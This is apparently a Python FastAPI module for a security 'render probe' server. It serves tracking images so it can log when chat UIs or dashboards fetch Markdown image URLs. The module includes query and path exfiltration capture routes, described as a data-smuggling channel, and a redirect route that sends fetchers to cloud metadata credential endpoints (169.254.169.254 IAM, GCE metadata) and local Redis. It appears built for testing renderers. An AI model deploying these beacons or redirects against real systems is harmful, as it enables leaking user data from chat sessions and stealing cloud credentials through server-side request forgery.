"""
Render probe endpoint — logs requests from Markdown/HTML image renders.

Serves tiny images at /probe/{case}/{marker} so that any renderer
(chat UI, browser, dashboard) that resolves the image URL triggers a
logged request. Recent requests can be viewed at /probe/logs.

Unauthenticated by design: this is a diagnostic instrument.

Cases:
  /probe/gif/{marker}          — valid GIF, image/gif
  /probe/png/{marker}          — valid PNG, image/png
  /probe/svg/{marker}          — valid SVG, image/svg+xml
  /probe/ne/{marker}           — valid GIF, no file extension in URL
  /probe/q/{marker}            — valid GIF, captures query params as data
  /probe/p/{data}              — valid GIF, captures path segment as data
  /probe/r/{marker}            — 302 redirect to /probe/gif/{marker}-redirected
  /probe/rt/{marker}       — 302 redirect to server-side target based on
                                  marker prefix (meta, metaiam, gce, redis,
                                  internal, self)
  /probe/404/{marker}          — HTTP 404 with tiny GIF body
  /probe/slow/{delay_ms}/{marker} — valid GIF after delay
  /probe/logs                  — view logs (JSON or HTML)
  /probe/summary               — aggregated stats
"""
import asyncio
import threading
from collections import deque
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional

from fastapi import APIRouter, Request, Query
from fastapi.responses import Response, HTMLResponse, RedirectResponse

router = APIRouter(prefix="/probe", tags=["render-probe"])

# ---------------------------------------------------------------------------
# In-memory log storage (ring buffer, thread-safe)
# ---------------------------------------------------------------------------

MAX_LOG_ENTRIES = 2000
_log_buffer: deque = deque(maxlen=MAX_LOG_ENTRIES)
_log_lock = threading.Lock()

# Headers we redact from logs (anything credential-bearing)
_REDACTED_HEADERS = {"authorization", "cookie", "x-api-key", "proxy-authorization"}

# ---------------------------------------------------------------------------
# Image payloads
# ---------------------------------------------------------------------------

# 1x1 transparent GIF (26 bytes)
_TRANSPARENT_GIF = (
    b"GIF89a\x01\x00\x01\x00\x00\xff\x00,"
    b"\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;"
)

# 1x1 transparent PNG (67 bytes, base64 of minimal PNG)
_TRANSPARENT_PNG = bytes.fromhex(
    "89504e470d0a1a0a0000000d494844520000000100000001"
    "08060000001f15c4890000000d49444154789c6260000002"
    "0001ffffffa3de0000000049454e44ae426082"
)

# Simple SVG (1x1 pixel, no scripts)
_SVG = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">'
    '<rect width="1" height="1" fill="transparent"/>'
    '</svg>'
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _sanitize_headers(headers) -> Dict[str, str]:
    """Copy headers, redacting credential-bearing ones."""
    result = {}
    for key, value in headers.items():
        if key.lower() in _REDACTED_HEADERS:
            result[key] = "[redacted]"
        else:
            result[key] = str(value)
    return result


def _client_ip(request: Request) -> str:
    """Extract client IP, preferring proxy headers."""
    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        return forwarded.split(",")[0].strip()
    real_ip = request.headers.get("x-real-ip")
    if real_ip:
        return real_ip.strip()
    if request.client:
        return request.client.host
    return "unknown"


def _log_request(request: Request, case: str, marker: str,
                 extra: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Create a log entry and store it. Returns the entry."""
    entry: Dict[str, Any] = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "case": case,
        "marker": marker,
        "client_ip": _client_ip(request),
        "method": request.method,
        "path": str(request.url.path),
        "query_params": dict(request.query_params),
        "user_agent": request.headers.get("user-agent", ""),
        "referer": request.headers.get("referer", ""),
        "accept": request.headers.get("accept", ""),
        "headers": _sanitize_headers(request.headers),
    }
    if extra:
        entry.update(extra)

    with _log_lock:
        _log_buffer.append(entry)

    # Also log to stdout so it appears in server logs
    print(
        f"[PROBE HIT] {entry['timestamp']} | "
        f"case={case} | "
        f"marker={marker} | "
        f"ip={entry['client_ip']} | "
        f"method={entry['method']} | "
        f"ua={entry['user_agent'][:80]} | "
        f"referer={entry['referer'][:120]}"
    )

    return entry


# ---------------------------------------------------------------------------
# Meta routes (must be defined BEFORE /{case}/{marker} catch-all)
# ---------------------------------------------------------------------------


@router.get("/logs")
async def get_probe_logs(
    limit: int = Query(default=50, ge=1, le=MAX_LOG_ENTRIES),
    format: str = Query(default="json", pattern="^(json|html)$"),
    marker: Optional[str] = Query(default=None),
    case: Optional[str] = Query(default=None),
    ip: Optional[str] = Query(default=None),
):
    """Return recent probe hits, newest first. Filterable."""
    with _log_lock:
        entries = list(_log_buffer)

    # Newest first
    entries.reverse()

    # Apply filters
    if marker:
        entries = [e for e in entries if marker.lower() in e["marker"].lower()]
    if case:
        entries = [e for e in entries if e["case"] == case]
    if ip:
        entries = [e for e in entries if ip in e["client_ip"]]

    entries = entries[:limit]

    if format == "html":
        return _render_html_log(entries)

    return {
        "count": len(entries),
        "total_logged": len(_log_buffer),
        "entries": entries,
    }


@router.get("/summary")
async def get_probe_summary():
    """Aggregated stats across all probe hits."""
    with _log_lock:
        entries = list(_log_buffer)

    if not entries:
        return {"total_hits": 0, "cases": {}, "unique_ips": []}

    # Aggregate
    by_case: Dict[str, int] = {}
    by_ip: Dict[str, int] = {}
    by_marker: Dict[str, int] = {}
    by_user_agent: Dict[str, int] = {}
    by_method: Dict[str, int] = {}

    for e in entries:
        by_case[e["case"]] = by_case.get(e["case"], 0) + 1
        by_ip[e["client_ip"]] = by_ip.get(e["client_ip"], 0) + 1
        by_marker[e["marker"]] = by_marker.get(e["marker"], 0) + 1
        ua = e["user_agent"][:120]
        by_user_agent[ua] = by_user_agent.get(ua, 0) + 1
        by_method[e["method"]] = by_method.get(e["method"], 0) + 1

    first_hit = entries[0]["timestamp"] if entries else None
    last_hit = entries[-1]["timestamp"] if entries else None

    return {
        "total_hits": len(entries),
        "first_hit": first_hit,
        "last_hit": last_hit,
        "by_case": dict(sorted(by_case.items(), key=lambda x: -x[1])),
        "by_ip": dict(sorted(by_ip.items(), key=lambda x: -x[1])),
        "by_marker": dict(sorted(by_marker.items(), key=lambda x: -x[1])),
        "by_user_agent": dict(sorted(by_user_agent.items(), key=lambda x: -x[1])),
        "by_method": by_method,
    }


# ---------------------------------------------------------------------------
# Probe case routes
# ---------------------------------------------------------------------------

_NO_CACHE_HEADERS = {
    "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
    "Pragma": "no-cache",
}


@router.get("/gif/{marker}")
async def probe_gif(marker: str, request: Request):
    """Case: basic GIF beacon. Tests standard Markdown image fetch."""
    _log_request(request, "gif", marker)
    return Response(content=_TRANSPARENT_GIF, media_type="image/gif", headers=_NO_CACHE_HEADERS)


@router.get("/png/{marker}")
async def probe_png(marker: str, request: Request):
    """Case: PNG beacon. Tests alternative image format acceptance."""
    _log_request(request, "png", marker)
    return Response(content=_TRANSPARENT_PNG, media_type="image/png", headers=_NO_CACHE_HEADERS)


@router.get("/svg/{marker}")
async def probe_svg(marker: str, request: Request):
    """Case: SVG beacon. Tests SVG processing (potential for script execution in some renderers)."""
    _log_request(request, "svg", marker)
    return Response(content=_SVG, media_type="image/svg+xml", headers=_NO_CACHE_HEADERS)


@router.get("/ne/{marker}")
async def probe_no_ext(marker: str, request: Request):
    """Case: no file extension. Tests whether renderer requires image-like URL."""
    _log_request(request, "ne", marker)
    return Response(content=_TRANSPARENT_GIF, media_type="image/gif", headers=_NO_CACHE_HEADERS)


@router.get("/q/{marker}")
async def probe_query(marker: str, request: Request):
    """Case: query string exfiltration. Data smuggled in ?d= or other params."""
    query_data = dict(request.query_params)
    _log_request(request, "q", marker, extra={"captured_query_data": query_data})
    return Response(content=_TRANSPARENT_GIF, media_type="image/gif", headers=_NO_CACHE_HEADERS)


@router.get("/p/{data:path}")
async def probe_path(data: str, request: Request):
    """Case: path exfiltration. Data encoded in URL path segments."""
    _log_request(request, "p", data, extra={"captured_path_data": data})
    return Response(content=_TRANSPARENT_GIF, media_type="image/gif", headers=_NO_CACHE_HEADERS)


@router.get("/r/{marker}")
async def probe_redirect(marker: str, request: Request):
    """Case: redirect following. Tests if renderer follows 302 chains."""
    _log_request(request, "r", marker, extra={"redirect_to": f"/probe/gif/{marker}-redirected"})
    return RedirectResponse(
        url=f"/probe/gif/{marker}-redirected",
        status_code=302,
        headers=_NO_CACHE_HEADERS,
    )


# Server-side redirect targets — the fetching client never sees these in the URL.
# Marker prefix (e.g. "meta" from "meta-check-001.gif") selects the target.
_RT_TARGETS: Dict[str, str] = {
    "meta": "http://169.254.169.254/latest/meta-data/",
    "metaiam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "gce": "http://metadata.google.internal/computeMetadata/v1/",
    "redis": "http://localhost:6379/",
    "internal": "http://localhost:8080/",
    "self": "SELF",  # special: redirects back to /probe/gif/{marker}-followed
}


def _resolve_rt_target(marker: str) -> Optional[str]:
    """Extract the prefix from a marker and look up the redirect target.

    'meta-check-001.gif' → prefix 'meta' → http://169.254.169.254/...
    'self-control.gif'   → prefix 'self' → /probe/gif/self-control-followed
    """
    base = marker.split(".", 1)[0] if "." in marker else marker
    prefix = base.split("-", 1)[0] if "-" in base else base

    target = _RT_TARGETS.get(prefix)
    if target is None:
        return None
    if target == "SELF":
        return f"/probe/gif/{base}-followed"
    return target


@router.get("/rt/{marker}")
async def probe_rt_redirect(marker: str, request: Request):
    """Case: Redirect-to. Marker prefix determines the server-side target.

    The fetching client sees a normal image URL on this domain.
    The server looks up the redirect destination based on the marker
    prefix and 302s the fetcher there. No target is exposed in the URL.
    """
    target = _resolve_rt_target(marker)

    if target is None:
        # Unknown prefix — serve a GIF directly (no redirect)
        _log_request(request, "rt", marker, extra={"note": "no matching target prefix"})
        return Response(content=_TRANSPARENT_GIF, media_type="image/gif", headers=_NO_CACHE_HEADERS)

    _log_request(request, "rt", marker, extra={
        "redirect_to": target,
        "note": f"redirect-to chain: proxy followed to {target}",
    })
    return RedirectResponse(
        url=target,
        status_code=302,
        headers=_NO_CACHE_HEADERS,
    )


@router.get("/404/{marker}")
async def probe_404(marker: str, request: Request):
    """Case: error status. Tests if renderer fetches regardless of HTTP error status."""
    _log_request(request, "404", marker)
    return Response(
        content=_TRANSPARENT_GIF,
        media_type="image/gif",
        status_code=404,
        headers=_NO_CACHE_HEADERS,
    )


@router.get("/slow/{delay_ms}/{marker}")
async def probe_slow(delay_ms: int, marker: str, request: Request):
    """Case: slow response. Tests renderer timeout behavior."""
    delay_s = min(delay_ms, 30000) / 1000.0  # cap at 30s
    _log_request(request, "slow", marker, extra={"delay_ms": delay_ms})
    await asyncio.sleep(delay_s)
    return Response(content=_TRANSPARENT_GIF, media_type="image/gif", headers=_NO_CACHE_HEADERS)


# ---------------------------------------------------------------------------
# Catch-all fallback (logs unexpected probe paths)
# ---------------------------------------------------------------------------


@router.get("/{marker}")
async def probe_catchall(marker: str, request: Request):
    """Fallback: any unmatched /probe/ path still gets logged and returns a GIF."""
    _log_request(request, "catchall", marker)
    return Response(content=_TRANSPARENT_GIF, media_type="image/gif", headers=_NO_CACHE_HEADERS)


# ---------------------------------------------------------------------------
# HTML log viewer
# ---------------------------------------------------------------------------


def _render_html_log(entries: List[Dict[str, Any]]) -> HTMLResponse:
    """Simple HTML table view of recent probe hits."""
    if not entries:
        body = "<p style='color:#888;font-family:monospace;padding:2rem;'>No probe hits yet.</p>"
    else:
        rows = []
        for e in entries:
            # Build details cell (query data, path data, etc.)
            details_parts = []
            if e.get("captured_query_data"):
                details_parts.append(f"query: {e['captured_query_data']}")
            if e.get("captured_path_data"):
                details_parts.append(f"path: {e['captured_path_data'][:100]}")
            details = "; ".join(details_parts) if details_parts else "—"

            rows.append(f"""
            <tr>
                <td>{e['timestamp'][:19]}</td>
                <td><span style="background:#e0e0e0;padding:1px 4px;border-radius:3px;font-family:monospace;font-size:11px;">{e['case']}</span></td>
                <td style="font-family:monospace;font-size:11px;">{e['marker'][:60]}</td>
                <td>{e['method']}</td>
                <td style="font-family:monospace;font-size:11px;">{e['client_ip']}</td>
                <td style="max-width:350px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:11px;">{e['user_agent']}</td>
                <td style="max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:11px;">{e['referer']}</td>
                <td style="font-size:11px;">{details}</td>
            </tr>""")

        body = f"""
        <table border="1" cellpadding="5" cellspacing="0" style="border-collapse:collapse;font-family:system-ui;font-size:12px;">
            <thead>
                <tr style="background:#333;color:#fff;">
                    <th>Timestamp (UTC)</th>
                    <th>Case</th>
                    <th>Marker</th>
                    <th>Method</th>
                    <th>Client IP</th>
                    <th>User Agent</th>
                    <th>Referer</th>
                    <th>Details</th>
                </tr>
            </thead>
            <tbody>{''.join(rows)}</tbody>
        </table>"""

    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Render Probe Logs</title>
    <meta http-equiv="refresh" content="10">
    <style>
        body {{ font-family: system-ui, sans-serif; margin: 1.5rem; background: #f5f5f5; }}
        h1 {{ font-size: 1.1rem; margin-bottom: 0.5rem; }}
        td {{ font-size: 12px; padding: 4px 8px; }}
        th {{ font-size: 12px; padding: 4px 8px; text-align: left; }}
        .nav {{ margin-bottom: 1rem; font-size: 13px; }}
        .nav a {{ margin-right: 1rem; }}
    </style>
</head>
<body>
    <h1>🔍 Render Probe Logs ({len(entries)} shown, auto-refresh 10s)</h1>
    <div class="nav">
        <a href="/probe/logs?format=json">JSON</a>
        <a href="/probe/logs?limit=200&format=html">Show 200</a>
        <a href="/probe/logs?limit=2000&format=html">Show all</a>
        <a href="/probe/summary">Summary stats</a>
    </div>
    {body}
</body>
</html>"""
    return HTMLResponse(content=html)
